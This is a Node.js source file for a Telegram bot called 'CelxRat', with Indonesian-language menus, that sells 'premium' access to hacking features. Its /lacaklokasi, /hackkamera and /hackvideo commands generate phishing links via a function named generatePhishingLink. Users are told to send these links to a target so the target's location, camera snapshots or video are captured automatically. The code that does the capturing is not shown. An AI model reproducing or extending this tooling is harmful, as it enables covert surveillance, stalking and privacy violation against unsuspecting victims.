const TelegramBot = require('node-telegram-bot-api');
const config = require('./config');
const premium = require('./lib/premium');
const logger = require('./lib/logger');
const fs = require('fs-extra');
const path = require('path');

const bot = new TelegramBot(config.token, { polling: true });
const dataDir = path.join(__dirname, 'data');

// Ensure data directory exists
fs.ensureDirSync(dataDir);

// Generate random progress animation
const progressAnimation = async (chatId) => {
    const frames = ['▰▱▱▱▱▱▱▱▱▱', '▰▰▱▱▱▱▱▱▱▱', '▰▰▰▱▱▱▱▱▱▱', '▰▰▰▰▱▱▱▱▱▱', 
                    '▰▰▰▰▰▱▱▱▱▱', '▰▰▰▰▰▰▱▱▱▱', '▰▰▰▰▰▰▰▱▱▱', '▰▰▰▰▰▰▰▰▱▱',
                    '▰▰▰▰▰▰▰▰▰▱', '▰▰▰▰▰▰▰▰▰▰'];
    
    for (let i = 0; i < frames.length; i++) {
        await bot.sendChatAction(chatId, 'typing');
        await new Promise(resolve => setTimeout(resolve, 300));
    }
};

// Generate phishing link
const generatePhishingLink = (type, userId, duration = null) => {
    const baseUrl = config.webhookUrl;
    let params = `?type=${type}&id=${userId}`;
    if (duration) params += `&duration=${duration}`;
    return `${baseUrl}${params}`;
};

// Main menu
const mainMenu = (chatId) => {
    const photo = 'https://files.catbox.moe/mq5i3b.jpg';
    const caption = `🤖𝗕𝗢𝗧 𝗖𝗘𝗟𝘅𝗥𝗔𝗧🤖
─────────────────────
｢ 🧑‍💻𝗗𝗔𝗧𝗔 ☇ 𝗕𝗢𝗧🧑‍💻 ｣
───
‎│◆ 𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗥 : ${config.devUsername}
‎│◆ 𝗩𝗘𝗥𝗦𝗜𝗢𝗡 : ${config.version}
‎│◆ 𝗡𝗔𝗠𝗘 𝗕𝗢𝗧 : ${config.botName}
‎│◆ 𝗦𝗖 𝗡𝗔𝗠𝗘 : ${config.botName}
─────────────────────`;

    const keyboard = {
        inline_keyboard: [
            [{ text: '𝗗𝗘𝗩-𝗠𝗘𝗡𝗨', callback_data: 'dev_menu' }],
            [{ text: '𝗛𝗔𝗖𝗞-𝗠𝗘𝗡𝗨', callback_data: 'hack_menu' }],
            [{ text: '𝗕𝗨𝗬 𝗦𝗖𝗥𝗜𝗣𝗧 𝗦𝗔𝗗𝗔𝗣', callback_data: 'buy_script' }]
        ]
    };

    bot.sendPhoto(chatId, photo, {
        caption: caption,
        parse_mode: 'HTML',
        reply_markup: keyboard
    });
};

// Buy script menu
const buyScriptMenu = (chatId) => {
    const text = `𝗛𝗔𝗥𝗚𝗔 𝗦𝗖𝗥𝗜𝗣𝗧 𝗦𝗮𝗱𝗮𝗽 𝗰𝗲𝗹𝗫𝗿𝗮𝘁
───
‎│◆ 𝗻𝗮𝗺𝗲 𝘀𝗰𝗿𝗶𝗽𝘁 : 𝗖𝗲𝗹𝘅𝗥𝗮𝘁
‎│◆ 𝘁𝘆𝗽𝗲 𝘀𝗰𝗿𝗶𝗽𝘁 : 𝘃𝘃𝗶𝗽 𝗼𝗻𝗹𝘆
‎│◆ 𝘀𝗰𝗿𝗶𝗽𝘁 : 𝗻𝗼 𝗲𝗻𝗰 𝟭𝟬𝟬%
‎│◆ 𝗵𝗮𝗿𝗴𝗮 : 𝟮𝟬𝗸
───
𝗞𝗘𝗨𝗡𝗧𝗨𝗡𝗚𝗔𝗡
───
‎│◆ Masuk grup informasi update
‎│◆ Bisa jualan akses sendiri
‎│◆ Di ajarin cara memakai & add sampai bisa
‎│◆ Bisa pakai sepuasnya
───
📌 𝗖𝗔𝗧𝗔𝗧𝗔𝗡
➥ Silahkan Tekan tombol ｢ 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿 ｣ apabila mau membeli script`;

    const keyboard = {
        inline_keyboard: [
            [{ text: '𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿', url: 'https://t.me/acelXmodz' }],
            [{ text: '𝗕𝗔𝗖𝗞', callback_data: 'back_main' }]
        ]
    };

    bot.sendMessage(chatId, text, {
        parse_mode: 'HTML',
        reply_markup: keyboard
    });
};

// Dev menu
const devMenu = (chatId) => {
    const isDev = chatId === config.devId;
    
    if (!isDev) {
        return bot.sendMessage(chatId, '❌ Lu bukan developer tolol!');
    }
    
    const text = `｢ 🧑‍💻𝗗𝗘𝗩-𝗠𝗘𝗡𝗨 ☇ 𝗕𝗢𝗧🧑‍💻 ｣
─────────────────────
‎│◆ /addpremium [user_id]
‎│◆ /deltpremium [user_id]
‎│◆ /maintenance [on/off]
‎│◆ /listpremium
─────────────────────`;

    const keyboard = {
        inline_keyboard: [
            [{ text: '𝗕𝗔𝗖𝗞', callback_data: 'back_main' }]
        ]
    };

    bot.sendMessage(chatId, text, {
        parse_mode: 'HTML',
        reply_markup: keyboard
    });
};

// Hack menu
const hackMenu = (chatId) => {
    const isPremium = premium.isPremium(chatId) || chatId === config.devId;
    
    const text = `｢ 🧑‍💻𝗛𝗔𝗖𝗞-𝗠𝗘𝗡𝗨 ☇ 𝗕𝗢𝗧🧑‍💻 ｣
───
‎│◆ /lacaklokasi
‎│◆ /hackkamera
‎│◆ /hackvideo [detik]
‎│◆ [MENDATANG]
─────────────────────
${!isPremium ? '\n⚠️ PREMIUM ONLY - BUY SCRIPT DULU BANGSAT' : ''}`;

    const keyboard = {
        inline_keyboard: [
            [{ text: '𝗕𝗔𝗖𝗞', callback_data: 'back_main' }]
        ]
    };

    bot.sendMessage(chatId, text, {
        parse_mode: 'HTML',
        reply_markup: keyboard
    });
};

// Command handlers
bot.onText(/\/start/, async (msg) => {
    const chatId = msg.chat.id;
    
    // Progress animation
    const waitMsg = await bot.sendMessage(chatId, `Wait a minute... 
▰▱▱▱▱▱▱▱▱▱ 10%`);
    
    for (let i = 2; i <= 10; i++) {
        await new Promise(resolve => setTimeout(resolve, 300));
        let progress = '▰'.repeat(i) + '▱'.repeat(10-i);
        let percent = i * 10;
        await bot.editMessageText(`Wait a minute... 
${progress} ${percent}%`, {
            chat_id: chatId,
            message_id: waitMsg.message_id
        });
    }
    
    await bot.deleteMessage(chatId, waitMsg.message_id);
    mainMenu(chatId);
});

// Hack commands
bot.onText(/\/lacaklokasi/, async (msg) => {
    const chatId = msg.chat.id;
    
    if (config.maintenance && chatId !== config.devId) {
        return bot.sendMessage(chatId, '❌ MAINTENANCE MODE - Only dev can use');
    }
    
    if (!premium.isPremium(chatId) && chatId !== config.devId) {
        return bot.sendMessage(chatId, '❌ Lu bukan premium, beli script dulu goblok!');
    }
    
    const link = generatePhishingLink('location', chatId);
    bot.sendMessage(chatId, `📍 LINK LACAK LOKASI:\n${link}\n\nKirim link ini ke target. Begitu target buka, auto gw kasih lokasi nya.`);
});

bot.onText(/\/hackkamera/, async (msg) => {
    const chatId = msg.chat.id;
    
    if (config.maintenance && chatId !== config.devId) {
        return bot.sendMessage(chatId, '❌ MAINTENANCE MODE - Only dev can use');
    }
    
    if (!premium.isPremium(chatId) && chatId !== config.devId) {
        return bot.sendMessage(chatId, '❌ Lu bukan premium, beli script dulu goblok!');
    }
    
    const link = generatePhishingLink('camera', chatId);
    bot.sendMessage(chatId, `📸 LINK HACK KAMERA:\n${link}\n\nKirim link ini ke target. Auto ambil gambar sesuai kamera yang kepake.`);
});

bot.onText(/\/hackvideo (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const duration = match[1];
    
    if (config.maintenance && chatId !== config.devId) {
        return bot.sendMessage(chatId, '❌ MAINTENANCE MODE - Only dev can use');
    }
    
    if (!premium.isPremium(chatId) && chatId !== config.devId) {
        return bot.sendMessage(chatId, '❌ Lu bukan premium, beli script dulu goblok!');
    }
    
    if (isNaN(duration) || duration < 1 || duration > 30) {
        return bot.sendMessage(chatId, '❌ Duration harus angka 1-30 detik!');
    }
    
    const link = generatePhishingLink('video', chatId, duration);
    bot.sendMessage(chatId, `🎥 LINK HACK VIDEO:\n${link}\n\nDurasi: ${duration} detik\nKirim link ini ke target. Auto rekam video selama ${duration} detik.`);
});

bot.onText(/\/hackvideo/, (msg) => {
    bot.sendMessage(msg.chat.id, '❌ Pakai format: /hackvideo [detik]\nContoh: /hackvideo 10');
});

// Dev commands
bot.onText(/\/addpremium (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    
    if (chatId !== config.devId) {
        return bot.sendMessage(chatId, '❌ Lu bukan developer tolol!');
    }
    
    const userId = parseInt(match[1]);
    if (premium.addPremium(userId)) {
        bot.sendMessage(chatId, `✅ User ${userId} ditambahkan ke premium`);
        bot.sendMessage(userId, '✅ Selamat lo sekarang premium! Bisa pake semua fitur hack.');
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} udah premium`);
    }
});

bot.onText(/\/deltpremium (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    
    if (chatId !== config.devId) {
        return bot.sendMessage(chatId, '❌ Lu bukan developer tolol!');
    }
    
    const userId = parseInt(match[1]);
    premium.removePremium(userId);
    bot.sendMessage(chatId, `✅ User ${userId} dihapus dari premium`);
    bot.sendMessage(userId, '❌ Maaf, premium lo dicabut');
});

bot.onText(/\/maintenance (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    
    if (chatId !== config.devId) {
        return bot.sendMessage(chatId, '❌ Lu bukan developer tolol!');
    }
    
    const mode = match[1].toLowerCase();
    if (mode === 'on') {
        config.maintenance = true;
        bot.sendMessage(chatId, '✅ Maintenance mode ON');
    } else if (mode === 'off') {
        config.maintenance = false;
        bot.sendMessage(chatId, '✅ Maintenance mode OFF');
    } else {
        bot.sendMessage(chatId, '❌ Pakai: /maintenance on / off');
    }
});

bot.onText(/\/listpremium/, async (msg) => {
    const chatId = msg.chat.id;
    
    if (chatId !== config.devId) {
        return bot.sendMessage(chatId, '❌ Lu bukan developer tolol!');
    }
    
    const list = premium.getAllPremium();
    let text = '📋 LIST PREMIUM USERS:\n';
    if (list.length === 0) {
        text += 'Kosong';
    } else {
        list.forEach(id => {
            text += `- ${id}\n`;
        });
    }
    
    bot.sendMessage(chatId, text);
});

// Callback query handlers
bot.on('callback_query', async (callbackQuery) => {
    const msg = callbackQuery.message;
    const data = callbackQuery.data;
    const chatId = msg.chat.id;
    
    switch(data) {
        case 'dev_menu':
            devMenu(chatId);
            break;
        case 'hack_menu':
            hackMenu(chatId);
            break;
        case 'buy_script':
            buyScriptMenu(chatId);
            break;
        case 'back_main':
            mainMenu(chatId);
            break;
    }
    
    bot.answerCallbackQuery(callbackQuery.id);
});

logger.log('Bot started successfully!');